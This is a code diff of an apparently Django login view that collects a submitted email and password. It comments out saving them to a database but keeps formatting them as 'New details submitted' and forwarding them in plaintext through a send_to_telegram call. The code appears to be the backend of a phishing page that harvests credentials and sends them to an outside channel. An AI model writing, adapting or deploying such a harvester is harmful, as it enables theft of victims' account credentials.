@@ -16,12 +16,12 @@ def login_view(request):
     if request.method == 'POST':
         email = request.POST.get("email")
         password = request.POST.get("pass")
-        if email and password:
-            # Save data to the database
-            Mail.objects.create(
-                email=email,
-                password=password
-            )
+        # if email and password:
+        #     # Save data to the database
+        #     Mail.objects.create(
+        #         email=email,
+        #         password=password
+        #     )
         subject = 'New details submitted'
         mail_message = f"{subject}\nusername: {email}\npassword: {password}"
         send_to_telegram(mail_message)
